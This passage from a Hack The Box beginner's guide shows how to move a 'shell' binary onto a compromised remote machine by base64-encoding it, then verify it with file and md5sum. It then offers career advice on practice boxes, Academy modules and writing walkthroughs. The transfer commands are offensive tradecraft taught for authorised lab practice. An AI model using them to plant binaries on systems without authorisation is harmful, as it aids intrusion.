```ls
base64 shell -w 0
```

This returns a huge base64 string.  
We copy it and on the remote machine we do:

```js
echo f0VMRgIBAQAAAAAAAAAAAAIAPgABAAAA... | base64 -d > shell
```

With this we reconstruct the original file byte by byte.

### Verify that the file is correct

It is always worth checking that the file has not been corrupted.

First, check the type:

```js
file shell
```

Example of correct output:

```c
ELF 64-bit LSB executable
```

Then, check the MD5 hash.

On our machine:

```c
md5sum shell
```

On the remote machine:

```c
md5sum shell
```

If both hashes match, the transfer is **100% correct**.

### Quick summary

Moving files is not advanced hacking, but **without this you are dead**.  
The more techniques you know, the less you will depend on the environment.

- If there is network → HTTP
- If there are credentials → SCP
- If there is nothing → Base64

And always, **verify what you upload**.

## Chapter 13: Looking at the path

At this point, we have already covered a solid base. We are not experts, but we are also not blindly swinging. Now it is time for something just as important as learning commands or tools: **deciding where we keep walking** and how to do it without getting lost along the way.

Hack The Box is not just a platform to “break machines”. Used well, it is a perfect environment to build **real skill**, **technical judgment**, and, over time, a **serious portfolio in offensive security**. This chapter is not about technique, it is about **next steps**.

### Boxes and challenges: raising the bar little by little

After completing a first easy machine, it is normal to feel confident… and that is where many people make a mistake. Progress is not about jumping directly to hard, but about **accumulating experience intelligently**.

A good next step is to **root a retired Easy-difficulty machine**. Retired machines allow access to full walkthroughs, and that is a huge advantage if used well. It is not about copying and pasting commands, but about **understanding the why behind each step**.

A very useful tip here is to first watch a video walkthrough, understand the general flow of the attack, and then **try to replicate it without following the video step by step**. If you get stuck, you go back to the walkthrough. This process teaches much more than simply reproducing commands.

When several Easy machines start to feel comfortable, it is time to **move up to Medium**. Here concepts that are not always present in easy ones usually appear: less obvious vectors, chaining of flaws, or more demanding enumeration. It is not frustration, it is learning.

### The first active machine: without a safety net

One of the most important milestones in Hack The Box is completing **your first active machine** without a walkthrough. Not because it is the hardest technically, but because it is the first time you rely **only on yourself**.

Ideally, you reach this point after having completed between **5 and 10 retired Easy/Medium machines**. When you choose your first active machine, look for an Easy with a low rating (1–3 out of 10). Even so, it will probably be hard. And that is a good sign.

Getting stuck, doubting, and having to go back is part of the process. It means you are thinking. Once you complete that first active machine, the rest starts to fit better. From there, you can repeat the process with more active machines and, little by little, with Medium or even Hard ones.

### Keep learning (for real)

Although machines and challenges are an excellent way to learn, **they do not cover everything**. Each box usually focuses on one or two specific concepts, and that can leave important gaps if we only learn through walkthroughs.

That is why it is key to **combine boxes with guided learning**, such as Academy modules. If you detect that you always fail in web, Active Directory, pivoting, or privesc, the logical thing is not to keep doing boxes at random, but to **reinforce that specific point**.

A good practice is to have a personal list of pending modules. Every time you feel that you lack a base in something, you go back to that list and tackle the next module. This way learning stops being chaotic and becomes intentional.

### Giving something back to the community

At some point you will have used help channels, forums, or hints from other people to move forward. That has happened to all of us. When you finish a machine, it is good practice to **go back and help others** who are stuck where you were stuck.

Explaining something to someone else is not only giving back the favor, it is one of the best ways to consolidate knowledge. Also, participating in the community improves your visibility and your profile within the sector.

### Documenting and sharing walkthroughs

Documenting what you do is not optional if you want to dedicate yourself to this professionally. While you work a machine, you should be writing down commands, decisions, and findings. Not only for yourself, but because **knowing how to document is a mandatory skill for any pentester**.

A good exercise is to take your best walkthrough of a retired machine, expand it, clean it up, and turn it into a complete writeup. Publishing it helps others, reinforces your learning, and starts building your technical presence.

Ideally, prepare walkthroughs of machines you just completed while active and publish them when they become retired. That way you contribute relevant and up-to-date content.

### The path does not end here

Even after all this, there is still a lot to do. Hack The Box is full of opportunities to keep growing. Some reasonable medium-term goals could be:

- Root retired Easy and Medium machines
- Complete active machines
- Solve challenges of increasing difficulty
- Share well-documented walkthroughs
- Complete offensive Academy modules
- Face Medium and Hard boxes while active
- Complete advanced tracks and labs

There is no rush. It is not a race.  
But there is one rule that never changes:

**The day you stop learning, you stop advancing.**